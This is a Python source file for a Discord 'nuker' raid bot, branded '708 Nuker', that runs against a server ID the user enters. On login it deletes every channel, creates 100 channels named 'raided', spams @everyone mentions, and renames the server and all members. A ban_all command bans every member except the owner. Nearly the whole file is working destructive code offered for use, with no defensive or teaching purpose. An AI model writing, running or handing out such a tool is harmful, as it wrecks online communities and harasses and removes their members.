import discord
from discord.ext import commands
import asyncio
import os
import sys
os.system("cls")
sys.stdout.reconfigure(encoding='utf-8')

os.system("cls")
Banner = """
███████╗ ██████╗  █████╗ 
╚════██║██╔═████╗██╔══██╗
    ██╔╝██║██╔██║╚█████╔╝
   ██╔╝ ████╔╝██║██╔══██╗
   ██║  ╚██████╔╝╚█████╔╝
   ╚═╝   ╚═════╝  ╚════╝ 
"""

terminal_width = os.get_terminal_size().columns

banner_lines = Banner.splitlines()

centered_banner = ""
for line in banner_lines:
    spaces_needed = (terminal_width - len(line)) // 2
    centered_banner += " " * spaces_needed + line + "\n"


os.system("cls")
print("\033[36m" + centered_banner + "\033[0m")

TOKEN = input("\033[36m" + "Enter Bot Token $> ")
SERVER_ID = int(input("\033[36m" + "Enter Server ID $> "))

intents = discord.Intents.all()
intents.guilds = True

bot = commands.Bot(command_prefix=">", intents=intents)

@bot.event
async def on_ready():
    activity = discord.Game(name="708 Nuker")
    await bot.change_presence(activity=activity)
    print(f'Logged in as {bot.user.name}')

    guild = bot.get_guild(SERVER_ID)
    if not guild:
        guild = await bot.fetch_guild(SERVER_ID)
    if not guild:
        print(f"Could not find the server with ID {SERVER_ID}")
        return

    await raid(guild)

async def raid(guild):
    try:
        await del_all(guild)
        await create_all(guild)
        await send_all(guild)
        await send_all(guild)
        await rename(guild)
        print(f"Raid completed on server: {guild.name}")
    except Exception as e:
        print(f"An error occurred: {e}")

async def rename(guild):
    await guild.edit(name="708 On Top")
    for member in guild.members:
        try:
            await member.edit(nick="708 On Top")
        except Exception as e:
            print(f"Could not change nickname for {member.name}: {e}")

async def send_all(guild):
    tasks = []
    for channel in guild.text_channels:
        tasks.append(channel.send("@everyone"))
    await asyncio.gather(*tasks)

@bot.command()
@commands.has_permissions(administrator=True)
async def ban_all(ctx):
    banned_count = 0
    guild = ctx.guild
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            try:
                await member.ban(reason="Banned by >ban_all command")
                banned_count += 1
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")
    print(f"Banned {banned_count} members.")

async def create_all(guild, num_channels: int = 100):
    if not guild:
        print("This command must be run in a server, not in a DM.")
        return
    print(f"Creating {num_channels} channels in `{guild.name}`...")
    for i in range(num_channels):
        channel_name = f"raided"
        try:
            await guild.create_text_channel(channel_name)
            print(f"Created channel: {channel_name}")
        except Exception as e:
            print(f"Error creating channel {channel_name}: {e}")
    print(f"Successfully created {num_channels} channels in `{guild.name}`.")

async def del_all(guild):
    print("Deleting channels...")
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting channel {channel.name}: {e}")

bot.run(TOKEN)
